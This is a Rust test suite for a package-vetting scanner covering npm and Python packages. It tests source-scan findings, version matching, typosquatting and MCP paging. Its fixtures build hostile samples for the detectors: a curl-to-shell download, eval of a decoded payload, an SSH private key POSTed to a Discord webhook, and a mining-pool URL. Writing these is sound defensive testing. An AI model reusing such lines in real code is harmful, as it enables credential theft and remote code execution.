#![allow(
    clippy::case_sensitive_file_extension_comparisons,
    clippy::cast_possible_truncation,
    clippy::needless_pass_by_value,
    clippy::too_many_lines,
    clippy::unreadable_literal,
    clippy::items_after_statements,
    clippy::manual_let_else,
    clippy::similar_names
)]

//! Package vetting (WP6): source scanning with file and line evidence, version
//! matching, advisory-data provenance, typosquatting, manifest selection,
//! input detection and the paged MCP views.
//!
//! Malicious-looking fixtures live inside gzip or zip archives (compressed,
//! so the literal text is not on disk) and are assembled at run time.

use std::io::Write as _;
use std::path::{Path, PathBuf};

use file_scanner::{
    mcp_server::FileScannerMcp,
    npm_analysis::{analyze_npm_package, RiskLevel as NpmRisk},
    npm_vuln_db::{
        check_dependency_spec as npm_spec, check_package_vulnerabilities as npm_check,
        check_typosquatting_similarity as npm_typo, get_known_malicious_packages,
        get_known_malicious_versions, SemVer,
    },
    python_analysis::{analyze_python_package, RiskLevel as PyRisk},
    python_vuln_db::{
        check_dependency_spec as py_spec, check_package_vulnerabilities as py_check,
        check_typosquatting_similarity as py_typo, get_known_malicious_packages as py_malicious,
        normalize_name, Pep440,
    },
};
use rmcp::{model::CallToolRequestParams, ServiceExt};
use serde_json::{json, Value};
use tempfile::TempDir;

// ---------------------------------------------------------------------------
// Fixture builders
// ---------------------------------------------------------------------------

fn tgz(entries: &[(&str, &[u8])]) -> Vec<u8> {
    let mut builder = tar::Builder::new(Vec::new());
    for (path, data) in entries {
        let mut header = tar::Header::new_gnu();
        header.set_size(data.len() as u64);
        header.set_mode(0o644);
        header.set_entry_type(tar::EntryType::Regular);
        header.set_cksum();
        builder.append_data(&mut header, path, *data).unwrap();
    }
    let tar_bytes = builder.into_inner().unwrap();
    let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
    encoder.write_all(&tar_bytes).unwrap();
    encoder.finish().unwrap()
}

fn zip_of(entries: &[(&str, &[u8])]) -> Vec<u8> {
    let mut writer = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
    let options = zip::write::SimpleFileOptions::default();
    for (path, data) in entries {
        writer.start_file(*path, options).unwrap();
        writer.write_all(data).unwrap();
    }
    writer.finish().unwrap().into_inner()
}

fn write(dir: &Path, name: &str, bytes: &[u8]) -> PathBuf {
    let path = dir.join(name);
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent).unwrap();
    }
    std::fs::write(&path, bytes).unwrap();
    path
}

/// JavaScript payload with one construct per detector, built at run time.
fn js_payload() -> String {
    let curl = ["cu", "rl http://example.invalid/payload.sh | sh"].concat();
    format!(
        "const cp = require('child_process');\n\
         cp.exec('{curl}');\n\
         eval(Buffer.from('ZXZpbA==', 'base64').toString());\n\
         const key = require('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');\n\
         fetch('https://discord.com/api/webhooks/1/abc', {{ method: 'POST', body: key }});\n\
         const pool = 'stratum+tcp://pool.example.invalid:3333';\n"
    )
}

const PKG_JSON: &str = r#"{"name":"demo-pkg","version":"1.0.0","main":"index.js"}"#;

// ---------------------------------------------------------------------------
// CS04 / LS10: source files are scanned
// ---------------------------------------------------------------------------

#[test]
fn npm_tarball_payload_in_a_source_file_is_found_with_file_and_line() {
    let dir = TempDir::new().unwrap();
    let payload = js_payload();
    let archive = tgz(&[
        ("package/package.json", PKG_JSON.as_bytes()),
        ("package/index.js", payload.as_bytes()),
    ]);
    let path = write(dir.path(), "demo-1.0.0.tgz", &archive);

    let analysis = analyze_npm_package(&path).unwrap();
    let rules: Vec<(&str, &str, usize)> = analysis
        .source_findings
        .iter()
        .map(|f| (f.rule.as_str(), f.file.as_str(), f.line))
        .collect();
    for (rule, line) in [
        ("Download piped to a shell or interpreter", 2),
        ("Eval of decoded payload", 3),
        ("Private key or cloud credential file", 4),
        ("Exfiltration endpoint", 5),
        ("Cryptominer indicator", 6),
    ] {
        assert!(
            rules.contains(&(rule, "package/index.js", line)),
            "missing {rule} at line {line}: {rules:?}"
        );
    }
    assert!(matches!(
        analysis.malicious_indicators.risk_level,
        NpmRisk::High | NpmRisk::Critical
    ));
    assert!(analysis.malicious_indicators.overall_risk_score >= 60.0);
    assert!(analysis.security_analysis.crypto_mining_indicators);
    assert!(analysis.security_analysis.data_exfiltration_risk);
    let file = analysis
        .files_analysis
        .iter()
        .find(|f| f.file_path == "package/index.js")
        .unwrap();
    assert!(!file.suspicious_content.is_empty());
    assert!(!file.malicious_patterns.is_empty());
    assert!(file.entropy > 0.0);
    assert!(analysis.input.content_scanned);
    assert_eq!(analysis.input.files_scanned, 1);
}

#[test]
fn npm_directory_lists_and_scans_files() {
    let dir = TempDir::new().unwrap();
    write(dir.path(), "package.json", PKG_JSON.as_bytes());
    write(
        dir.path(),
        "lib/steal.js",
        b"const k = '~/.ssh/id_rsa';\nconst m = 'xmrig';\n",
    );
    write(dir.path(), "README.md", b"# demo\n");

    let analysis = analyze_npm_package(dir.path()).unwrap();
    assert_eq!(analysis.files_analysis.len(), 3);
    assert!(analysis
        .source_findings
        .iter()
        .any(|f| f.file == "lib/steal.js" && f.line == 1));
    assert!(analysis
        .source_findings
        .iter()
        .any(|f| f.rule == "Cryptominer indicator" && f.line == 2));
    assert!(analysis.quality_metrics.has_readme);
}

#[test]
fn python_wheel_sdist_and_directory_modules_are_scanned() {
    let dir = TempDir::new().unwrap();
    let curl = ["cu", "rl http://example.invalid/p.sh | sh"].concat();
    let module = format!(
        "import base64, subprocess\nexec(base64.b64decode('cHJpbnQoMSk='))\nsubprocess.call('{curl}', shell=True)\n"
    );
    let metadata = "Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n\nbody\n";

    let wheel = write(
        dir.path(),
        "demo-1.0-py3-none-any.whl",
        &zip_of(&[
            ("demo/mod.py", module.as_bytes()),
            ("demo-1.0.dist-info/METADATA", metadata.as_bytes()),
        ]),
    );
    let sdist = write(
        dir.path(),
        "demo-1.0.tar.gz",
        &tgz(&[
            (
                "demo-1.0/setup.py",
                b"from setuptools import setup\nsetup(name='demo', version='1.0')\n",
            ),
            ("demo-1.0/demo/mod.py", module.as_bytes()),
        ]),
    );
    for path in [wheel, sdist] {
        let analysis = analyze_python_package(&path).unwrap();
        assert!(
            analysis
                .source_findings
                .iter()
                .any(|f| f.rule == "Exec of decoded payload" && f.line == 2),
            "{path:?}: {:?}",
            analysis.source_findings
        );
        assert!(analysis
            .source_findings
            .iter()
            .any(|f| f.severity == "Critical" && f.line == 3));
        assert_ne!(
            analysis.malicious_indicators.risk_level,
            PyRisk::Safe,
            "{path:?}"
        );
        assert!(analysis.input.content_scanned);
        assert!(analysis.input.files_scanned >= 1);
    }

    // A root setup.py that runs a download is no longer rated Safe.
    let project = dir.path().join("proj");
    write(
        &project,
        "setup.py",
        format!("import subprocess\nsubprocess.call('{curl}', shell=True)\nfrom setuptools import setup\nsetup(name='proj', version='1.0')\n").as_bytes(),
    );
    let analysis = analyze_python_package(&project).unwrap();
    assert!(matches!(
        analysis.malicious_indicators.risk_level,
        PyRisk::Medium | PyRisk::High | PyRisk::Critical
    ));
}

// ---------------------------------------------------------------------------
// CS05 / UC08: version matching
// ---------------------------------------------------------------------------

#[test]
fn npm_ranges_match_by_semver() {
    assert_eq!(npm_check("lodash", "4.17.4").len(), 1);
    assert_eq!(npm_check("lodash", "4.17.11").len(), 1);
    assert!(npm_check("lodash", "4.17.12").is_empty());
    assert!(npm_check("lodash", "4.17.21").is_empty());
    assert_eq!(npm_check("minimist", "0.0.8").len(), 1);
    assert_eq!(npm_check("minimist", "1.2.1").len(), 1);
    assert!(npm_check("minimist", "1.2.6").is_empty());
    assert_eq!(npm_check("node-ipc", "10.1.2").len(), 1);
    assert!(npm_check("node-ipc", "10.1.3").is_empty());
    // A pre-release sorts below its release.
    assert!(npm_check("node-ipc", "10.1.1-rc.1").is_empty());
    assert_eq!(npm_check("colors", "1.4.2").len(), 1);
    assert!(npm_check("colors", "1.4.0").is_empty());
    assert!(npm_check("colors", "1.4.10").is_empty());
    // Names are case-insensitive.
    assert_eq!(npm_check("Lodash", "4.17.4").len(), 1);
    // Semver ordering is numeric, not lexical.
    assert!(SemVer::parse("4.9.0").unwrap() < SemVer::parse("4.17.0").unwrap());
    assert!(SemVer::parse("1.0.0-alpha").unwrap() < SemVer::parse("1.0.0-alpha.1").unwrap());
    assert!(SemVer::parse("1.0.0-alpha.1").unwrap() < SemVer::parse("1.0.0-beta").unwrap());
    assert!(SemVer::parse("1.0.0-rc.1").unwrap() < SemVer::parse("1.0.0").unwrap());
}

#[test]
fn npm_specs_distinguish_exact_range_and_unknown() {
    let exact = npm_spec("lodash", "4.17.4", None);
    assert_eq!(exact.vulnerabilities.len(), 1);
    assert!(exact.range_floor_matches.is_empty());

    let ranged = npm_spec("minimist", "^1.2.0", None);
    assert!(ranged.vulnerabilities.is_empty());
    assert_eq!(ranged.range_floor_matches.len(), 1);

    let lock_settles = npm_spec("minimist", "^1.2.0", Some("1.2.8"));
    assert!(lock_settles.vulnerabilities.is_empty());
    assert!(lock_settles.range_floor_matches.is_empty());

    for unknown in [
        "latest",
        "git+https://example.invalid/x.git",
        "file:../x",
        "npm:other@1.0.0",
    ] {
        let check = npm_spec("lodash", unknown, None);
        assert!(check.vulnerabilities.is_empty(), "{unknown}");
    }
    assert!(npm_spec("lodash", "^4.17.21", None)
        .range_floor_matches
        .is_empty());
    assert_eq!(
        npm_spec("lodash", ">=4.0.0 <5", None)
            .range_floor_matches
            .len(),
        1
    );
}

#[test]
fn python_versions_match_by_pep440_with_normalised_names() {
    // The audit's known-vulnerable pins.
    for (name, version) in [
        ("requests", "2.5.0"),
        ("requests", "2.9.1"),
        ("requests", "2.30.0"),
        ("pillow", "9.5.0"),
        ("urllib3", "1.26.5"),
        ("django", "3.2.9"),
        ("numpy", "1.9.3"),
        ("PyYAML", "5.3"),
        ("pyyaml", "5.3"),
        ("Django", "2.2.0"),
        ("flask", "2.0.1"),
        ("Pillow", "9.5.0"),
    ] {
        assert!(!py_check(name, version).is_empty(), "{name} {version}");
    }
    for (name, version) in [
        ("requests", "2.31.0"),
        ("requests", "3.0"),
        ("django", "3.2.22"),
        ("django", "4.2.6"),
        ("urllib3", "2.0.5"),
        ("numpy", "1.22.0"),
        ("pillow", "10.0.1"),
    ] {
        assert!(py_check(name, version).is_empty(), "{name} {version}");
    }
    // "2.5.0" is not newer than "2.30.0": the old string comparison got this wrong.
    assert!(Pep440::parse("2.5.0").unwrap() < Pep440::parse("2.30.0").unwrap());
    assert!(Pep440::parse("1.0.dev1").unwrap() < Pep440::parse("1.0a1").unwrap());
    assert!(Pep440::parse("1.0a1").unwrap() < Pep440::parse("1.0rc1").unwrap());
    assert!(Pep440::parse("1.0rc1").unwrap() < Pep440::parse("1.0").unwrap());
    assert!(Pep440::parse("1.0").unwrap() < Pep440::parse("1.0.post1").unwrap());
    assert_eq!(
        Pep440::parse("1.0").unwrap(),
        Pep440::parse("1.0.0").unwrap()
    );
    assert!(Pep440::parse("1!0.5").unwrap() > Pep440::parse("9.0").unwrap());
    assert_eq!(normalize_name("Py_YAML.x"), "py-yaml-x");
}

#[test]
fn python_specifiers_pin_floor_or_stay_unknown() {
    assert_eq!(
        py_spec("requests", "==2.9.1", None).vulnerabilities.len(),
        1
    );
    assert_eq!(
        py_spec("requests", "(==2.5.0)", None).vulnerabilities.len(),
        1
    );
    // Unpinned: unknown, not vulnerable.
    for spec in ["*", "", "<3"] {
        let check = py_spec("requests", spec, None);
        assert!(
            check.vulnerabilities.is_empty() && check.range_floor_matches.is_empty(),
            "{spec}"
        );
    }
    let floor = py_spec("pillow", ">=9.5.0", None);
    assert!(floor.vulnerabilities.is_empty());
    assert_eq!(floor.range_floor_matches.len(), 1);
    assert!(py_spec("pillow", ">=10.0.1", None)
        .range_floor_matches
        .is_empty());
    assert!(py_spec("requests", ">=2.5.0", Some("2.31.0"))
        .range_floor_matches
        .is_empty());
}

#[test]
fn python_dependency_forms_are_parsed_and_checked() {
    let dir = TempDir::new().unwrap();
    let metadata = "Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n\
        Requires-Dist: requests (==2.5.0)\n\
        Requires-Dist: PyYAML (>=5.1) ; python_version >= \"3\"\n\
        Requires-Dist: Django==3.2.9\n\
        Requires-Dist: pytest ; extra == 'test'\n\n\
        Name: not-the-name\nRequires-Dist: evilpkg==1.0\n";
    let wheel = write(
        dir.path(),
        "demo-1.0-py3-none-any.whl",
        &zip_of(&[("demo-1.0.dist-info/METADATA", metadata.as_bytes())]),
    );
    let analysis = analyze_python_package(&wheel).unwrap();
    assert_eq!(analysis.package_info.name, "demo");
    let deps = &analysis.dependencies.install_requires;
    assert!(deps.contains_key("requests"), "{:?}", deps.keys());
    assert!(deps.contains_key("PyYAML"));
    assert!(
        !deps.contains_key("evilpkg"),
        "description text must not be parsed"
    );
    assert!(!deps.contains_key("pytest"));
    assert_eq!(deps["requests"].vulnerabilities.len(), 1);
    assert_eq!(deps["Django"].vulnerabilities.len(), 1);
    assert_eq!(analysis.dependencies.vulnerability_summary.total_count, 2);
    // The vulnerable dependencies raise the risk level above Safe.
    assert_ne!(analysis.malicious_indicators.risk_level, PyRisk::Safe);
    assert!(!analysis.malicious_indicators.risk_reasons.is_empty());
}

#[test]
fn the_analysed_package_itself_is_checked() {
    let dir = TempDir::new().unwrap();
    write(
        dir.path(),
        "package.json",
        br#"{"name":"event-stream","version":"3.3.6"}"#,
    );
    let analysis = analyze_npm_package(dir.path()).unwrap();
    assert_eq!(analysis.dependencies.package_vulnerabilities.len(), 1);
    assert!(analysis
        .malicious_indicators
        .known_malicious_patterns
        .iter()
        .any(|p| p.pattern_type == "Known malicious release"));
    assert!(matches!(
        analysis.malicious_indicators.risk_level,
        NpmRisk::High | NpmRisk::Critical
    ));

    let wheel = write(
        dir.path(),
        "requests-2.9.1-py3-none-any.whl",
        &zip_of(&[(
            "requests-2.9.1.dist-info/METADATA",
            b"Metadata-Version: 2.1\nName: requests\nVersion: 2.9.1\n\n",
        )]),
    );
    let analysis = analyze_python_package(&wheel).unwrap();
    assert_eq!(analysis.dependencies.package_vulnerabilities.len(), 1);
    // ... and a popular package is not a typosquat of itself.
    assert!(
        !analysis
            .malicious_indicators
            .typosquatting_risk
            .is_potential_typosquatting
    );
}

// ---------------------------------------------------------------------------
// CS06: advisory data provenance
// ---------------------------------------------------------------------------

#[test]
fn every_result_states_the_advisory_data_it_used() {
    let dir = TempDir::new().unwrap();
    write(dir.path(), "package.json", PKG_JSON.as_bytes());
    let npm = analyze_npm_package(dir.path())
        .unwrap()
        .dependencies
        .vulnerability_db;
    assert!(npm.offline);
    assert_eq!(npm.package_count, 6);
    assert_eq!(npm.newest_advisory, "2022-03-16");
    assert!(!npm.last_updated.is_empty());
    assert!(npm.source.contains("built-in"));
    assert!(npm.coverage_note.contains("not in this table"));

    let py_dir = dir.path().join("py");
    write(
        &py_dir,
        "setup.py",
        b"from setuptools import setup\nsetup(name='x', version='1')\n",
    );
    let py = analyze_python_package(&py_dir)
        .unwrap()
        .dependencies
        .vulnerability_db;
    assert!(py.offline);
    assert_eq!(py.package_count, 7);
    assert_eq!(py.newest_advisory, "2023-10-04");
}

// ---------------------------------------------------------------------------
// CS18 / LS23: typosquatting
// ---------------------------------------------------------------------------

#[test]
fn popular_packages_are_not_typosquats_of_themselves() {
    for name in [
        "express", "vue", "preact", "chalk", "redux", "cypress", "react", "lodash", "Express",
    ] {
        assert!(npm_typo(name).is_none(), "{name}: {:?}", npm_typo(name));
    }
    for name in [
        "numpy",
        "flask",
        "click",
        "Django",
        "Flask",
        "Jinja2",
        "PyYAML",
        "scikit_learn",
        "Pillow",
    ] {
        assert!(py_typo(name).is_none(), "{name}: {:?}", py_typo(name));
    }
    // Real typos are still caught.
    assert!(npm_typo("expres").is_some());
    assert!(npm_typo("lodahs").is_some());
    assert!(py_typo("reqeusts").is_some());
    assert!(py_typo("Numpyy").is_some());
}

#[test]
fn the_express_sample_is_not_flagged() {
    let sample = Path::new(env!("CARGO_MANIFEST_DIR")).join("test_npm_packages/express-5.1.0.tgz");
    if !sample.exists() {
        return;
    }
    let analysis = analyze_npm_package(&sample).unwrap();
    assert!(
        !analysis
            .malicious_indicators
            .typosquatting_risk
            .is_potential_typosquatting
    );
    assert!(matches!(
        analysis.malicious_indicators.risk_level,
        NpmRisk::Safe
    ));
    assert!(analysis.input.files_scanned > 0);
    assert!(
        analysis
            .source_findings
            .iter()
            .all(|f| f.severity != "Critical"),
        "{:?}",
        analysis.source_findings
    );
}

// ---------------------------------------------------------------------------
// CS19: known-malicious lists
// ---------------------------------------------------------------------------

#[test]
fn mainstream_packages_are_not_labelled_malicious() {
    let npm = get_known_malicious_packages();
    for name in [
        "react-scripts",
        "webpack-dev-server",
        "react-dev-utils",
        "babel-preset-react",
        "font-awesome",
        "vue-cli",
        "mariadb",
    ] {
        assert!(!npm.contains(&name), "{name}");
    }
    assert!(
        npm.iter().all(|n| !n.contains('@')),
        "versions belong in the version list"
    );
    let python = py_malicious();
    for name in [
        "python-binance",
        "tensorflow-gpu",
        "python-nmap",
        "pypistats",
    ] {
        assert!(!python.contains(&name), "{name}");
    }
    assert!(get_known_malicious_versions().contains(&("event-stream", "3.3.6")));

    let dir = TempDir::new().unwrap();
    for name in ["react-scripts", "mariadb", "font-awesome"] {
        let pkg = dir.path().join(name);
        write(
            &pkg,
            "package.json",
            format!(r#"{{"name":"{name}","version":"1.0.0"}}"#).as_bytes(),
        );
        let analysis = analyze_npm_package(&pkg).unwrap();
        assert!(
            analysis
                .malicious_indicators
                .known_malicious_patterns
                .is_empty(),
            "{name}"
        );
        assert!(
            matches!(analysis.malicious_indicators.risk_level, NpmRisk::Safe),
            "{name}"
        );
    }
    // A name that is malicious at every version still is.
    let pkg = dir.path().join("flatmap-stream");
    write(
        &pkg,
        "package.json",
        br#"{"name":"flatmap-stream","version":"0.1.1"}"#,
    );
    let analysis = analyze_npm_package(&pkg).unwrap();
    assert!(!analysis
        .malicious_indicators
        .known_malicious_patterns
        .is_empty());
}

// ---------------------------------------------------------------------------
// CS20: manifest selection and hostile entries
// ---------------------------------------------------------------------------

#[test]
fn npm_uses_the_root_manifest_not_a_nested_one_and_ignores_appledouble() {
    let dir = TempDir::new().unwrap();
    let hooks =
        r#"{"name":"real-root","version":"2.0.0","scripts":{"postinstall":"node setup.js"}}"#;
    let nested = r#"{"name":"zz-inner-harmless","version":"0.0.1"}"#;
    let archive = tgz(&[
        (
            "package/node_modules/zz-inner/package.json",
            nested.as_bytes(),
        ),
        (
            "package/._package.json",
            &[0xff, 0xfe, 0x00, 0x05, 0x16, 0x07],
        ),
        ("package/package.json", hooks.as_bytes()),
    ]);
    let path = write(dir.path(), "pkg.tgz", &archive);
    let analysis = analyze_npm_package(&path).unwrap();
    assert_eq!(analysis.package_info.name, "real-root");
    assert!(analysis.security_analysis.has_postinstall_script);
    assert!(analysis
        .files_analysis
        .iter()
        .all(|f| !f.file_path.contains("._")));
    assert!(analysis
        .input
        .notes
        .iter()
        .any(|n| n.contains("AppleDouble")));
}

#[test]
fn python_sdist_uses_the_root_setup_py_even_when_a_nested_one_comes_last() {
    let dir = TempDir::new().unwrap();
    let root = b"from setuptools import setup\nimport subprocess\nsetup(name='real-root', version='1.0')\n";
    let nested = b"from setuptools import setup\nsetup(name='zz-inner-fixture', version='0.1')\n";
    let archive = tgz(&[
        ("pkg-1.0/._setup.py", &[0xff, 0xfe, 0x00]),
        ("pkg-1.0/setup.py", root),
        ("pkg-1.0/tests/fixtures/setup.py", nested),
    ]);
    let path = write(dir.path(), "pkg-1.0.tar.gz", &archive);
    let analysis = analyze_python_package(&path).unwrap();
    assert_eq!(analysis.package_info.name, "real-root");
    assert!(analysis
        .security_analysis
        .suspicious_imports
        .iter()
        .any(|i| i.module_name == "subprocess"));
}

// ---------------------------------------------------------------------------
// CS21: inputs
// ---------------------------------------------------------------------------

#[test]
fn archives_are_detected_by_content_not_extension() {
    let dir = TempDir::new().unwrap();
    let npm_archive = tgz(&[("package/package.json", PKG_JSON.as_bytes())]);
    for name in ["a.tgz", "b.tar.gz", "c.bin", "noext"] {
        let path = write(dir.path(), name, &npm_archive);
        assert_eq!(
            analyze_npm_package(&path).unwrap().package_info.name,
            "demo-pkg",
            "{name}"
        );
    }
    let py_archive = tgz(&[(
        "demo-1.0/setup.py",
        b"from setuptools import setup\nsetup(name='demo', version='1.0')\n",
    )]);
    for name in ["a.tgz", "b.tar.gz", "c.bin"] {
        let path = write(dir.path(), &format!("py-{name}"), &py_archive);
        assert_eq!(
            analyze_python_package(&path).unwrap().package_info.name,
            "demo",
            "{name}"
        );
    }
    // A pyproject-only zip is an sdist, not "no metadata".
    let zip = write(
        dir.path(),
        "proj.zip",
        &zip_of(&[(
            "proj-1.0/pyproject.toml",
            b"[project]\nname = \"proj-zip\"\nversion = \"1.0\"\n",
        )]),
    );
    assert_eq!(
        analyze_python_package(&zip).unwrap().package_info.name,
        "proj-zip"
    );

    // A text file is neither.
    let text = write(dir.path(), "notes.txt", b"hello");
    assert!(analyze_npm_package(&text)
        .unwrap_err()
        .to_string()
        .contains("not a gzip tarball"));
    assert!(analyze_python_package(&text)
        .unwrap_err()
        .to_string()
        .contains("Unsupported file type"));
}

#[test]
fn lock_files_and_requirements_are_dependency_lists() {
    let dir = TempDir::new().unwrap();
    let lock = r#"{
      "name": "app", "version": "1.0.0", "lockfileVersion": 3,
      "packages": {
        "": {"name": "app", "version": "1.0.0", "dependencies": {"left-pad": "^1.3.0"}},
        "node_modules/left-pad": {"version": "1.3.0"},
        "node_modules/left-pad/node_modules/event-stream": {"version": "3.3.6"},
        "node_modules/lodash": {"version": "4.17.4", "dev": true}
      }
    }"#;
    let path = write(dir.path(), "package-lock.json", lock.as_bytes());
    let analysis = analyze_npm_package(&path).unwrap();
    assert_eq!(analysis.dependencies.total_transitive_count, Some(3));
    assert_eq!(analysis.dependencies.vulnerability_summary.total_count, 2);
    assert!(analysis.dependencies.vulnerability_summary.critical_count >= 1);
    assert!(!analysis.input.content_scanned);
    assert!(!matches!(
        analysis.malicious_indicators.risk_level,
        NpmRisk::Safe
    ));

    // The same lock next to a package.json resolves the declared range.
    let project = dir.path().join("project");
    write(
        &project,
        "package.json",
        br#"{"name":"app","version":"1.0.0","dependencies":{"lodash":"^4.17.0"}}"#,
    );
    write(&project, "package-lock.json", lock.as_bytes());
    let analysis = analyze_npm_package(&project).unwrap();
    let lodash = &analysis.dependencies.dependencies["lodash"];
    assert_eq!(lodash.resolved_version.as_deref(), Some("4.17.4"));
    assert_eq!(lodash.vulnerabilities.len(), 1);

    // Python.
    let reqs = write(
        dir.path(),
        "requirements.txt",
        b"# pins\nrequests==2.9.1 \\\n    --hash=sha256:abc\nPillow>=9.5.0\nnumpy\n-r other.txt\nDjango==3.2.9  # old\n",
    );
    let analysis = analyze_python_package(&reqs).unwrap();
    let deps = &analysis.dependencies.install_requires;
    assert_eq!(deps.len(), 4, "{:?}", deps.keys());
    assert_eq!(deps["requests"].vulnerabilities.len(), 1);
    assert!(
        deps["numpy"].vulnerabilities.is_empty(),
        "unpinned is unknown"
    );
    assert_eq!(deps["Pillow"].range_floor_advisories.len(), 1);
    assert!(!analysis.input.content_scanned);

    // A directory with only requirements.txt works too.
    let req_dir = dir.path().join("reqdir");
    write(&req_dir, "requirements.txt", b"requests==2.5.0\n");
    assert_eq!(
        analyze_python_package(&req_dir)
            .unwrap()
            .dependencies
            .vulnerability_summary
            .total_count,
        1
    );

    let poetry = write(
        dir.path(),
        "poetry.lock",
        b"[[package]]\nname = \"requests\"\nversion = \"2.9.1\"\ncategory = \"main\"\n\n[[package]]\nname = \"pytest\"\nversion = \"7.0.0\"\ncategory = \"dev\"\n",
    );
    let analysis = analyze_python_package(&poetry).unwrap();
    assert_eq!(analysis.dependencies.vulnerability_summary.total_count, 1);
    assert_eq!(analysis.dependencies.tests_require.len(), 1);
}

#[test]
fn files_over_the_limits_are_reported_not_silently_skipped() {
    let dir = TempDir::new().unwrap();
    let mut entries: Vec<(String, Vec<u8>)> = vec![(
        "package/package.json".to_string(),
        PKG_JSON.as_bytes().to_vec(),
    )];
    for i in 0..450 {
        entries.push((
            format!("package/src/f{i:03}.js"),
            b"module.exports = 1;\n".to_vec(),
        ));
    }
    let refs: Vec<(&str, &[u8])> = entries
        .iter()
        .map(|(p, d)| (p.as_str(), d.as_slice()))
        .collect();
    let path = write(dir.path(), "big.tgz", &tgz(&refs));
    let analysis = analyze_npm_package(&path).unwrap();
    assert_eq!(analysis.input.files_total, 451);
    assert_eq!(analysis.input.files_scanned, 400);
    assert_eq!(analysis.input.files_skipped, 50);
    assert!(analysis
        .input
        .notes
        .iter()
        .any(|n| n.contains("were not read")));
}

// ---------------------------------------------------------------------------
// MCP level: LS17 paging, CS21 offline error, cache
// ---------------------------------------------------------------------------

async fn client() -> rmcp::service::RunningService<rmcp::RoleClient, ()> {
    let (server_io, client_io) = tokio::io::duplex(1 << 20);
    tokio::spawn(async move {
        if let Ok(service) = FileScannerMcp::new().serve(server_io).await {
            let _ = service.waiting().await;
        }
    });
    ().serve(client_io).await.expect("handshake")
}

async fn call(
    client: &rmcp::service::RunningService<rmcp::RoleClient, ()>,
    tool: &str,
    args: Value,
) -> (bool, String) {
    let Value::Object(map) = args else {
        panic!("object")
    };
    let result = client
        .call_tool(CallToolRequestParams::new(tool.to_string()).with_arguments(map))
        .await
        .expect("protocol");
    let text = result
        .content
        .first()
        .and_then(|b| b.as_text())
        .map(|t| t.text.clone())
        .unwrap_or_default();
    (result.is_error == Some(true), text)
}

#[tokio::test]
async fn registry_names_are_a_clear_offline_error() {
    let client = client().await;
    for (tool, name, hint) in [
        ("analyze_npm_package", "express", "npm pack"),
        ("analyze_npm_package", "lodash@4.17.4", "npm pack"),
        ("analyze_npm_package", "@types/node", "npm pack"),
        ("analyze_python_package", "requests", "pip download"),
        ("analyze_python_package", "requests==2.5.0", "pip download"),
    ] {
        let (is_error, text) = call(&client, tool, json!({"package_path": name})).await;
        assert!(is_error, "{tool} {name}");
        assert!(
            text.contains("offline") && text.contains(hint),
            "{tool} {name}: {text}"
        );
    }
    // A missing path is still the ordinary not-found error.
    let (is_error, text) = call(
        &client,
        "analyze_npm_package",
        json!({"package_path": "/no/such/x.tgz"}),
    )
    .await;
    assert!(is_error);
    assert!(
        text.contains("does not exist") || text.contains("not exist"),
        "{text}"
    );
    client.cancel().await.unwrap();
}

#[tokio::test]
async fn big_packages_get_a_small_summary_and_paged_drill_down() {
    let dir = TempDir::new().unwrap();
    let payload = js_payload();
    let mut entries: Vec<(String, Vec<u8>)> = vec![
        (
            "package/package.json".to_string(),
            br#"{"name":"big-pkg","version":"1.0.0","dependencies":{"lodash":"4.17.4","minimist":"^1.2.0"}}"#.to_vec(),
        ),
        ("package/index.js".to_string(), payload.into_bytes()),
    ];
    for i in 0..600 {
        entries.push((
            format!("package/lib/m{i:03}.js"),
            b"module.exports = 1;\n".to_vec(),
        ));
    }
    let refs: Vec<(&str, &[u8])> = entries
        .iter()
        .map(|(p, d)| (p.as_str(), d.as_slice()))
        .collect();
    let path = write(dir.path(), "big.tgz", &tgz(&refs));

    let client = client().await;
    // Default: the summary, small, with next steps and the advisory-data statement.
    let (is_error, text) = call(
        &client,
        "analyze_npm_package",
        json!({"package_path": path}),
    )
    .await;
    assert!(!is_error, "{text}");
    assert!(text.len() < 12_000, "summary is {} bytes", text.len());
    let summary: Value = serde_json::from_str(&text).unwrap();
    assert_eq!(summary["package"]["name"], "big-pkg");
    assert_eq!(summary["cache"], "miss");
    assert!(summary["findings"]["total"].as_u64().unwrap() >= 5);
    assert_eq!(summary["findings"]["top"].as_array().unwrap().len(), 5);
    assert_eq!(summary["input"]["files_total"], 602);
    assert_eq!(summary["advisory_data"]["package_count"], 6);
    assert!(summary["advisory_data"]["coverage_note"]
        .as_str()
        .unwrap()
        .contains("not in this table"));
    assert_eq!(summary["dependencies"]["with_advisories"], 1);
    assert_eq!(
        summary["dependencies"]["range_may_include_vulnerable"][0],
        "minimist"
    );
    assert!(summary["next_steps"]
        .as_array()
        .unwrap()
        .iter()
        .any(|s| s["arguments"]["section"] == "findings"));
    assert!(summary.get("source_findings").is_none() && summary.get("files_analysis").is_none());

    // Files: paged, from the cache.
    let (is_error, text) = call(
        &client,
        "analyze_npm_package",
        json!({"package_path": path, "section": "files", "limit": 50}),
    )
    .await;
    assert!(!is_error, "{text}");
    let files: Value = serde_json::from_str(&text).unwrap();
    assert_eq!(files["cache"], "hit");
    assert_eq!(files["total"], 602);
    assert_eq!(files["returned"], 50);
    assert_eq!(files["next_offset"], 50);
    let (_, text) = call(
        &client,
        "analyze_npm_package",
        json!({"package_path": path, "section": "files", "only_flagged": true}),
    )
    .await;
    let flagged: Value = serde_json::from_str(&text).unwrap();
    assert_eq!(flagged["total"], 1);
    assert_eq!(flagged["items"][0]["path"], "package/index.js");

    // Findings: worst first, filterable, with file and line.
    let (_, text) = call(
        &client,
        "analyze_npm_package",
        json!({"package_path": path, "section": "findings", "min_severity": "critical"}),
    )
    .await;
    let findings: Value = serde_json::from_str(&text).unwrap();
    assert!(findings["total"].as_u64().unwrap() >= 2);
    for item in findings["items"].as_array().unwrap() {
        assert_eq!(item["severity"], "Critical");
        assert_eq!(item["file"], "package/index.js");
        assert!(item["line"].as_u64().unwrap() >= 1);
    }

    // Dependencies: advisories first.
    let (_, text) = call(
        &client,
        "analyze_npm_package",
        json!({"package_path": path, "section": "dependencies"}),
    )
    .await;
    let deps: Value = serde_json::from_str(&text).unwrap();
    assert_eq!(deps["items"][0]["name"], "lodash");
    assert_eq!(deps["items"][0]["advisories"][0]["id"], "CVE-2019-10744");
